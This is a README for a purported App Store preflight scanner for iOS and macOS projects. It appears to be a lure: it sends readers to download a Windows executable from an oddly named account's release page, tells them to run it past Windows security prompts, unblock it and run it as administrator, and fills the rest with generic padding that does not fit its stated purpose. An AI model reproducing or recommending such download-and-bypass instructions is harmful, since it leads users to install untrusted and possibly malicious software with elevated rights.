# 🧰 app-store-preflight-skills - Check App Store Risks Before Submission

[⬇️ Download the latest release](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)

## 🖥️ What this app does

app-store-preflight-skills helps you scan iOS and macOS projects before you send them to the App Store. It looks for common rejection patterns and flags things that may cause review issues.

Use it to check for:

- missing app permissions text
- weak privacy wording
- risky API use
- build settings that may trigger review problems
- common metadata issues
- App Store rule patterns that often lead to rejection

## 📦 What you need

Before you run the app on Windows, make sure you have:

- Windows 10 or Windows 11
- a stable internet connection
- enough free disk space for the app and your project files
- the project folder you want to check
- permission to read the files in that folder

The app is built for simple local use. You open it, choose a project, and run a scan.

## ⬇️ Download the app

1. Open the release page:
   [https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
2. Find the latest release at the top of the page.
3. In the release assets, download the Windows file.
4. Save the file to your Downloads folder or another easy-to-find place.

## 🪟 Install on Windows

1. Open the file you downloaded.
2. If Windows shows a security prompt, choose the option to keep or run the file.
3. Follow the setup steps on screen.
4. If the app opens as a single file, move it to a folder you can use later.
5. If Windows asks for permission, choose Yes.

If you use a browser download bar, you can also right-click the file and choose Show in folder.

## ▶️ Run the app

1. Open the app from the Start menu or from the folder where you saved it.
2. Wait for the main screen to load.
3. Choose the iOS or macOS project folder you want to check.
4. Start the scan.
5. Review the results shown by the app.

The app checks your project and lists items that need attention before submission.

## 🔍 What the scan checks

The scan looks for common issues that often lead to App Store review problems.

### Permission text

The app checks for common missing permission messages, such as:

- camera use
- microphone use
- photo access
- location access
- contacts access
- Bluetooth use

If your app asks for access but does not explain why, App Store review may flag it.

### Privacy wording

The app checks for plain, clear privacy text in places such as:

- app descriptions
- permission prompts
- release notes
- metadata fields

### Risky code patterns

The app looks for patterns that often need a second look, such as:

- private or unsupported APIs
- old framework use
- unclear background activity
- file access patterns that may not match Apple rules

### Build and project settings

The app reviews common settings that can affect review, such as:

- signing setup
- bundle info
- target settings
- platform compatibility

### Store listing content

The app can also help you catch problems in text you plan to send with the app, such as:

- broken claim language
- unclear feature notes
- missing usage detail
- inconsistent app names

## 🧭 How to use it well

1. Scan the project before you archive or submit it.
2. Fix the items marked as high risk first.
3. Scan again after each change.
4. Keep your app copy clear and direct.
5. Use the same app name, version, and bundle info across files.

If you work on more than one app, scan each project on its own. That helps you keep results clear.

## 📁 Best folder setup

For the cleanest results, keep your project in a simple folder structure like this:

- one folder per app
- one main source folder
- one build output folder
- one folder for notes or review text

Avoid putting the project inside deep nested folders with long names. Short paths make file checks easier.

## 🧪 Good scan habits

To get useful results:

- run a scan after major changes
- run a scan before each release
- check permission text after adding new features
- review any file marked as unusual
- keep release notes short and plain

If the app flags a file you do not expect, check that file against the rest of your project. A small mismatch can cause a review issue.

## 🛠️ Common Windows setup fixes

### The app does not open

- Check that the download finished
- Try opening the file again
- Move the file to your Desktop and run it from there
- Right-click the file and try Run as administrator if Windows blocks it

### Windows blocks the file

- Open the file’s properties
- Look for an Unblock option
- Apply the change and try again

### The app opens but looks blank

- Wait a few seconds for the first scan screen to load
- Resize the window
- Close and reopen the app

### The app cannot read your project

- Make sure the folder still exists
- Check that you chose the correct folder
- Move the project to a simpler path
- Avoid folders with special access rules

## 🧾 What the results mean

The app uses simple labels to help you read the report.

- **Low risk** means the item looks fine
- **Review** means the item may need a second look
- **High risk** means the item may lead to rejection
- **Unknown** means the app could not confirm the item

Treat the report as a checklist. Fix the high risk items first, then review the rest.

## 🧩 Example workflow

1. Open your app project.
2. Run a preflight scan.
3. Read the flagged items.
4. Update the project files.
5. Run the scan again.
6. Repeat until the report is clean enough for submission.
7. Prepare your App Store package and review text.
8. Submit with more confidence

## 📌 When to run a scan

Run a scan when you:

- add a new permission
- change privacy text
- add background work
- update app metadata
- change your build settings
- prepare a release for App Store review
- switch from test mode to production mode

## 🔐 Privacy and local use

This app is meant to scan your project files on your machine. Keep your source files in a place you trust and use standard Windows file access settings. If you store projects in shared folders, make sure you can read them without access errors.

## 🧠 Tips for non-technical users

If you are not used to project files, start with these steps:

- use the folder that contains your app files
- do not open random subfolders unless asked
- keep one backup copy before you change anything
- save text changes in small steps
- scan again after each change

If you are unsure which file to edit, search for the text shown in the report. That is often the fastest way to find the issue.

## 🗂️ Release page

Use the release page to get the Windows version:
[https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)

## 📄 File types you may see

Depending on the release, you may see one of these:

- an `.exe` file
- a zipped folder
- a packaged desktop app
- a single launch file

If you download a zipped folder, right-click it and choose Extract All before opening the app.

## 🧰 If you need to share results

You can use the scan report to:

- track fixes across a team
- review issues before sending to a developer
- compare results between builds
- keep notes for your next submission

When sharing the report, keep the project path and private file names out of view if they contain sensitive data.

## 📍 Quick start

1. Visit the release page.
2. Download the latest Windows file.
3. Open the file and follow the setup steps.
4. Choose your app project folder.
5. Run a scan and review the results